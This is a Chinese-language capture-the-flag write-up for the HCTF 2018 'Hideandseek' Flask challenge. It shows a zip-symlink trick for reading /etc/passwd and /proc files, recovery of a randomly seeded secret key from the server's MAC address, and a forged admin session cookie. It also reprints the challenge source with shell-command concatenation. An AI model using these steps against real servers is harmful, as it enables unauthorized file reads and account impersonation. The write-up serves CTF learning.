# [HCTF 2018]Hideandseek

## Idea

* admin不能登陆,用个其他用户名登陆,上传一个zip后解压出了内容

* 用软链接读取文件

    `ln -s /etc/passwd passwd && zip -y passwd.zip passwd`

* 解码cookie后发现里面就是

    `{'usernmae': 'test'}`

* 读文件需要路径,先找路径,构造一个`/proc/self/cmdline`发现为

    `cat./uploads/cmd.zip_/cmd`

    所以是用了子进程,我们也得不到原进程的pid

* 尝试读取环境变量`/proc/self/environ`

    ```bash
    HOSTNAME=3d37d57ac5c4
    SHLVL=1
    PYTHON_PIP_VERSION=19.1.1
    HOME=/root
    GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
    UWSGI_INI=/app/uwsgi.ini
    WERKZEUG_SERVER_FD=3
    NGINX_MAX_UPLOAD=0
    UWSGI_PROCESSES=16
    STATIC_URL=/
    static_=/usr/local/bin/python
    UWSGI_CHEAPER=2
    WERKZEUG_RUN_MAIN=true
    NGINX_VERSION=1.15.8-1~stretch
    PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    NJS_VERSION=1.15.8.0.2.7-1~stretch
    LANG=C.UTF-8
    PYTHON_VERSION=3.6.8
    NGINX_WORKER_PROCESSES=1
    LISTEN_PORT=80
    STATIC_INDEX=0
    PWD=/app
    PYTHONPATH=/app
    STATIC_PATH=/app/static
    FLAG=not_flag
    ```

    发现在`/app`目录下面还有一个`uwsgi.ini`,查了一下

    > uWSGI是一个WEB应用服务器,它具有应用服务器,代理,进程管理及应用监控等功能,它支持WSGI协议,同时它也支持自身的uWSGI协议

    读取得到

    ```bash
    [uwsgi]
    module = main
    callable=app
    logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log
    ```

    再读取`然后我们读取/app/main.py`,发现是一个flask程序,但不是网页程序,查看wp发现是读取`/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py`,上面得到的环境变量也和我们不同,很奇怪,正确的代码为

    ```py
    # -*- coding: utf-8 -*-
    from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
    import uuid
    import base64
    import random
    import flag
    from werkzeug.utils
    import secure_filename
    import os
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
    app.config['UPLOAD_FOLDER'] = './uploads'
    app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
    ALLOWED_EXTENSIONS = set(['zip'])

    def allowed_file(filename):
        return '.' in filename and \
            filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

    @app.route('/', methods=['GET'])
    def index():
        error = request.args.get('error', '')
        if(error == '1'):
            session.pop('username', None)
            return render_template('index.html', forbidden=1)
        if 'username' in session:
            return render_template('index.html', user=session['username'], flag=flag.flag)
        else:
            return render_template('index.html')

    @app.route('/login', methods=['POST'])
    def login():
        username=request.form['username']
        password=request.form['password']
        if request.method == 'POST' and username != '' and password != '':
            if(username == 'admin'):
                return redirect(url_for('index',error=1))
            session['username'] = username
            return redirect(url_for('index'))

    @app.route('/logout', methods=['GET'])
    def logout():
        session.pop('username', None)
        return redirect(url_for('index'))

    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'the_file' not in request.files:
            return redirect(url_for('index'))
        file = request.files['the_file']
        if file.filename == '':
            return redirect(url_for('index'))
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if(os.path.exists(file_save_path)):
                return 'This file already exists'
            file.save(file_save_path)
        else:
            return 'This file is not a zipfile'
        try:
            extract_path = file_save_path + '_'
            os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
            read_obj = os.popen('cat ' + extract_path + '/*')
            file = read_obj.read()
            read_obj.close()
            os.system('rm -rf ' + extract_path)
        except Exception as e:
            file = None
            os.remove(file_save_path)
        if(file != None):
            if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
        return Response(file)

    if __name__ == '__main__':
        #app.run(debug=True)
        app.run(host='0.0.0.0', debug=True, port=10008)
    ```

    可以发现这里的`SECRET_KEY`使用随机数生成的,随机数的种子是`uuid.getnode()`也就是mac地址的10进制值

* 读取`/sys/class/net/eth0/address`

    `02:42:ac:10:a2:d3`

    即`2485377868499`

    得到随机字符串

    `84.91467897774343`

    然后伪造cookie

    `eyJ1c2VybmFtZSI6ImFkbWluIn0.X5Ywaw.LC4lhBv-3erNQE8JGkaivu15N7o`

    即可得到flag

## Payload
